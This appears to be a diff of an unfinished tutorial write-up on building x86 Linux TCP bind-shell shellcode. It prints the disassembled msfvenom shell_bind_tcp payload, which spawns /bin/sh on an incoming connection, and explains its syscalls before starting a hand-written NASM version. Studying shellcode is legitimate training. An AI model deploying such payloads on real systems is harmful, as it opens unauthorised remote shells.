@@ -12,11 +12,11 @@ Create a Shell_Bind_TCP shellcode that;
 1. Binds to an easily configurable port number
 2. Executes a shell on an incoming connection
 
-## MSFVenom Shellcode Under the Microscope
+### MSFVenom Shellcode Under the Microscope
 
 A bind shell is a type of shell in which the system on which the code is run binds a TCP socket that is designated to listen for incoming connections to a specified port and IP address. When a bind shell is used, the system on which the bind shell is executed acts as the listener. When a connection is accepted on the bound and listening socket on the designated port and IP address, a shell will be spawned on the system on which the code is run. 
 
-While analyzing shell_bind_tcp shellcode produced by msfvenom, it appears that a total of six syscalls are executed in sequential order. The order goes: `socket`, `bind`, `listen`, `accept`, `dup2`, and execve. We can analyze unistd_32.h to grab our syscall identifiers:
+While analyzing shell_bind_tcp shellcode produced by msfvenom, it appears that a total of six syscalls are executed in sequential order. The order goes: `socket`, `bind`, `listen`, `accept`, `dup2`, `execve`. We can analyze unistd_32.h to grab our syscall identifiers:
 ```
 egrep "_socket |_accept |_bind |_listen |_accept4 |_dup2 |_execve " unistd_32.h
 
@@ -42,7 +42,7 @@ push ebx
 push byte +0x2 
 mov ecx,esp  
 mov al,0x66  
-int 0x80 ; socket 
+int 0x80 ;;; socket 
 pop ebx  
 pop esi  
 push edx  
@@ -53,19 +53,19 @@ push eax
 mov ecx,esp  
 push byte +0x66 
 pop eax  
-int 0x80 ; bind
+int 0x80 ;;; bind
 mov [ecx+0x4],eax  
 mov bl,0x4  
 mov al,0x66  
-int 0x80 ; listen
+int 0x80 ;;; listen
 inc ebx  
 mov al,0x66  
-int 0x80 ; accept
+int 0x80 ;;; accept
 xchg eax,ebx  
 pop ecx  
 push byte +0x3f 
 pop eax  
-int 0x80 ; dup2
+int 0x80 ;;; dup2
 dec ecx  
 jns 0x32  
 push dword 0x68732f2f 
@@ -75,43 +75,60 @@ push eax
 push ebx  
 mov ecx,esp  
 mov al,0xb  
-int 0x80 ; execve
+int 0x80 ;;; execve
 ```
 
-The socket or SYS_SOCKETCALL is syscall number 102 or 0x66 which receives three arguements according to `man7.org/linux/man-pages/man2/socketcall.2.html`. The received arguements are `domain (selects the protocal which we want tcp)`, `type (we want SOCK_STREAM)`, and `protocol ()`
+## Building a TCP Bind Shell.
+
+The socket or SYS_SOCKETCALL is syscall decimal number 102 or hex 0x66 which receives three arguements according to `man7.org/linux/man-pages/man2/socketcall.2.html`. The received arguements are `domain (selects the protocal which we want tcp)`, `type (we want SOCK_STREAM)`, and `protocol ()`.
 
 Any socket in C would be built upon the skeleton below:
+
 ```c socket_skeleton = int socket(int domain, int type, int protocol);```
 
 The manpage ip(7) further explains that a TCP socket should be created with these paramaters:
-```c tcp_socket = socket(AF_INET, SOCK_STREAM, 0);``` which in `pseudocode` would be translated to:
+
+```c tcp_socket = socket(AF_INET, SOCK_STREAM, 0);``` which in pseudocode would be translated to:
 ```c tcp_socket = 0x66(2, 1, 0)```
 
 Further examples of alternate sockets include:
+
 ```c udp_socket = socket(AF_INET, SOCK_DGRAM, 0)
      raw_socket = socket(AF_INET, SOCK_RAW, protocol)```
 
-Let's start building our tcp bind shell.
 
-###Assembly Start
+### Socket
 ```nasm
 global _start
 
 section .text
 _start:
 	;Begin by calling/intializing socket
+	
 	push 0x66 ; rather than xor'ing eax, eax we can do a push 
 	pop eax   ; of the syscall socket and pop it into eax sparing us a byte (eax).
-	;Feed socket syscall it's arguements starting with domain (1 aka SYS_SOCKET) which can be referenced in /usr/include/linux/net.h.
-	push 0x1  ; same method as before to spare us a byte (ebx).
-	pop ebx	  ;
 	
+	;Feed socket syscall it's arguements starting with domain (1 aka SYS_SOCKET) 
+	;which can be referenced in /usr/include/linux/net.h.
 	
-	
-	
+	xor ebx, ebx  ; clear ebx
+	push ebx      ; push third arg on stack (protocol)
+	push 0x1      ; push second arg on stack (SOCK_STREAM)
+	push 0x2      ; push first arg on stack (AF_INET)
+	mov ecx, esp  ; move esp pointer to ecx
+	int 0x80      ; call interrupt to execute socket syscall
 ```
 
+Let's analyze the `BIND` syscall arguements. A bind function would appear as so:
+```int bind(int sockfd, const struct sockaddr *addr, socklen_t addrlen);```
 
+
+### Bind
+Now that we have created a socket, it is time to bind to a given port.
+
+```
+	; Begin 
+```
 
 
 ### Create a TCP Socket
